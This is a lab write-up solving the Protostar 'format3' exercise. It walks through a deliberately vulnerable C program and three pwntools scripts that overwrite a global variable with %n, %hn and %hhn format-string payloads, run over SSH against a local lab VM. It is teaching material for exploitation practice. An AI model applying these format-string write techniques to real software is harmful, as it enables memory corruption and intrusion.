# Format 3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}

```

The vuln function call "printfbuffer" which is vulnerable to format string attack.

Ok , so this time we need to overwrite "target" with 0x01025544


Since there isn't any sanity check on our input we can simply use the format specifier %p  to find where our input is on the stack.
We can use a recognizable pattern to find where on the stack it is located which allows us to find the start of "buffer".

Tips: 
We can print a specific argument on the stack using %i$x which print the ith argument on the stack.

Ex: 
```c
printf("%3$x", 10,11,12); // output 0xc which is 12 in hex
```
I automated it to find it quicker: 


```python
def find_pos():
    r = ssh(host="192.168.160.128" ,password="user" , user="user")

    control_pos=0 

    for i in range(20): 
        format3 = r.run(["/opt/protostar/bin/format3"])
        payload="CCCC%{}$pAAAA".format(i) # we use the following pattern CCCC%i$pAAAA

        format3.sendline(payload)
        output=str(format3.recv())
        if "43434343" in output: # if we found the CCCC on the stack we have found the start of our control buffer
            print("POSTION : ", i, "\noutput: ", output)
            control_pos= i

            format3.close()
            return control_pos 
        format3.close()

    return control_pos

```
output:

```bash
...
[*] Closed SSH channel with 192.168.160.128
[+] Opening new channel: ['/opt/protostar/bin/format3']: Done
[*] Closed SSH channel with 192.168.160.128
[+] Opening new channel: ['/opt/protostar/bin/format3']: Done
[*] Closed SSH channel with 192.168.160.128
[+] Opening new channel: ['/opt/protostar/bin/format3']: Done
[*] Closed SSH channel with 192.168.160.128
[+] Opening new channel: ['/opt/protostar/bin/format3']: Done
[*] Closed SSH channel with 192.168.160.128
[+] Opening new channel: ['/opt/protostar/bin/format3']: Done
[*] Closed SSH channel with 192.168.160.128
[+] Opening new channel: ['/opt/protostar/bin/format3']: Done
POSTION :  12 
output:  b'CCCC0x43434343AAAA\ntarget is 00000000 :(\n'
[*] Closed SSH channel with 192.168.160.128

```
So at the 12th position our CCCC is being located, the idea is to replace CCCC 
with the address of "target" and then overwrite the value at this address.

## address of target

```bash
user@protostar:~$ objdump -t /opt/protostar/bin/format3 | grep -i target
080496f4 g     O .bss	00000004              target
```


There are 3 way to overwrite the value of "target" and we are going to see all of them.

# solution 1: overwrite 4 bytes in ones (approach with %n)

Thanks to the format specifier %n  we can write the number of characters which is printed before %n at the address we are pointing to. 
(With %n we overwrite can overwrite 4 bytes)

ex: 

```c

int a=0;
printf("ABCD%n", &a);  // output ABCD
printf("%d", a);  // output 4 , 4 bytes are written before the format specifier : 'ABCD'

```

We want to write  0x01025544 in "target". If we use the format specifier %n we will need 
to write  16930116 characters. (0x01025544 in decimal)

Remember our payload will be this form : 
CCCC%12$nAAAA

We replace CCCC with the address of target :

080496f4 => in  little endian format \xf4\x96\x04\x08

\xf4\x96\x04\x08%12$nAAAA   with this payload we have currently write 4 bytes (address of "target")

, so we need to write 16930116-4 = 16930112 

To write this amount of characters we can use the format specifier %16930112x wich will add a 
padding to the value found on the stack.

ex : 
```c
printf("%5x", 1) //  output:    1 
                            <---> 4 space 

//length(space) + length(1) = 5  
```


### script

```python
target_address = 0x080496f4

def overwrite4_bytes():
    r = ssh(host="192.168.160.128" ,password="user" , user="user")
    payload = p32(target_address) +  b"%16930112x%12$nAAAA" 
    format3 = r.run(["/opt/protostar/bin/format3"])
    format3.sendline(payload)
    print(format3.recvuntil(b"target"))
    format3.close()


```
output:

```bash
..
you have modified the target'
[*] Closed SSH channel with 192.168.160.128
```


The problem of this technique is that is going to print the padding of 16930112 (spaces) when printbuffer will be
called. It's pretty annoying because we have to wait until all the spaces are printed before the win is printed.



# solution 2: overwrite 2 bytes at once (approach with %hn)

The second way to overwrite the value of "target" is to modify in 2 times , two bytes.


In our example we need to overwrite target with 0x01025544 (\x44\x55\x02\x01 in  little endian)

before modification : 

```
target = 0x00000000

0x080496f7  00
0x080496f6  00
0x080496f5  00 
0x080496f4  00
```

1 ) overwrite the  last two bytes with 0x5544

```
target = 0x00005544 
target address : 0x080496f4


0x080496f7  00
0x080496f6  00
0x080496f5  55 
0x080496f4  44
```


 
2 ) overwrite the first two bytes with 0x0102

```
target = 0x01025544
target address : 0x080496f6

To do so we can use format specifier %hn which will overwrite two bytes.


0x080496f7  01
0x080496f6  02
0x080496f5  55 
0x080496f4  44
```

### script


```python

target_address = 0x080496f4

def overwrite2_bytes():
    r =ssh(host="192.168.160.128", user='user', password="user")
    format3 = r.run(["/opt/protostar/bin/format3"])

    payload =  p32(target_address) + p32(target_address+2) + b"%21820x"  + b"%12$hnAAAA"    +   b"%43962x"  +  b"%13$hnAAAA" 
    # we control the 12th arguments :
    #   12th argument :  0x080496f4  we will write  0x5544 - 8 = 21820   (8: two times 4 bytes  -> length of address)
    #   13th argument :  0x080496f6  we are going to write: 0x0102 - 0x5544 - 4 but it won't work since 0x0102 - 0x5544 < 0 
    #                     We are going to use a trick 0x10102 - 0x5544 - 4 = 43962 
    #   

    format3.sendline(payload)
    print(format3.recvuntil("target"))
    format3.close()



```


# solution 3: overwrite 1 bytes at a time (approach with %hhn)

The last way to solve it is to change one byte at time:

we need to overwrite target with 0x01025544 (\x44\x55\x02\x01 in  little endian)

read bottom to top:
```

 ^ address     goal         calculation
 |
 | 0x080496f7  0x01         0x101 - 0x02 - 4 =  251
 | 0x080496f6  0x02         0x102 - 0x55 - 4 = 169
 | 0x080496f5  0x55         0x55  - 0x44 -  4 = 13
 | 0x080496f4  0x44         0x44  - (4*4) = 52

```
### script

```python 

target_address = 0x080496f4

def overwrite1_bytes():
    r =ssh(host="192.168.160.128", user='user', password="user")
    format3 = r.run(["/opt/protostar/bin/format3"])

    payload =  p32(target_address) + p32(target_address+1) + p32(target_address+2) + p32(target_address+3)  + b"%52x"  +  b"%12$hhnAAAA"  + b"%13x"  +  b"%13$hhnAAAA"  +   b"%169x"  +  b"%14$hhnAAAA"   +  b"%251x"  +  b"%15$hhnAAAA" 


    format3.sendline(payload)
    print(format3.recvuntil(":)"))
    format3.close()


```




